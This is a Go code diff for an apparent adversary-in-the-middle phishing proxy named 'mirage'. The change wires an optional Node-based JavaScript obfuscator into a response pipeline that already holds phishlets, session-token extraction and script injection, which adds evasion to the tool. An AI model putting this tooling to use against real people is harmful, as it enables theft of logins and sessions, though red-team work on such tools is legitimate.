@@ -15,6 +15,7 @@ import (
 	"github.com/travisbale/mirage/internal/config"
 	"github.com/travisbale/mirage/internal/dns"
 	"github.com/travisbale/mirage/internal/events"
+	"github.com/travisbale/mirage/internal/obfuscator"
 	"github.com/travisbale/mirage/internal/phishlet"
 	"github.com/travisbale/mirage/internal/proxy"
 	"github.com/travisbale/mirage/internal/proxy/handlers/request"
@@ -97,6 +98,17 @@ func (d *Daemon) Init(ctx context.Context) error {
 		Logger:    d.log,
 	})
 
+	// Init JS obfuscator — defaults to no-op; upgraded to Node sidecar when enabled.
+	d.obfuscator = &obfuscator.NoOpObfuscator{}
+	if cfg.Obfuscator.Enabled {
+		n, err := obfuscator.NewNodeObfuscator(cfg.Obfuscator, d.log)
+		if err != nil {
+			d.log.Warn("failed to start Node obfuscator sidecar, falling back to no-op", "error", err)
+		} else {
+			d.obfuscator = n
+		}
+	}
+
 	// Build pipeline and proxy.
 	pipeline := buildPipeline(pipelineDeps{
 		botGuardSvc:      botGuardSvc,
@@ -109,6 +121,7 @@ func (d *Daemon) Init(ctx context.Context) error {
 		bus:              d.bus,
 		apiHandler:       apiHandler,
 		apiHostname:      cfg.API.SecretHostname,
+		obfuscator:       d.obfuscator,
 	}, d.log)
 
 	aitmProxy := &proxy.AITMProxy{
@@ -291,6 +304,7 @@ type pipelineDeps struct {
 	bus              aitm.EventBus
 	apiHandler       *api.Router
 	apiHostname      string
+	obfuscator       scriptObfuscator
 }
 
 func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
@@ -314,7 +328,7 @@ func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
 		&response.SubFilterApplier{},
 		&response.TokenExtractor{Store: d.sessionStore, Bus: d.bus, Completer: d.sessionSvc, Whitelist: d.blacklistSvc},
 		&response.JSInjector{},
-		&response.JSObfuscator{Obfuscator: &response.NoOpObfuscator{}},
+		&response.JSObfuscator{Obfuscator: d.obfuscator, Logger: logger},
 	}
 	return &proxy.Pipeline{RequestHandlers: req, ResponseHandlers: resp, Logger: logger}
 }
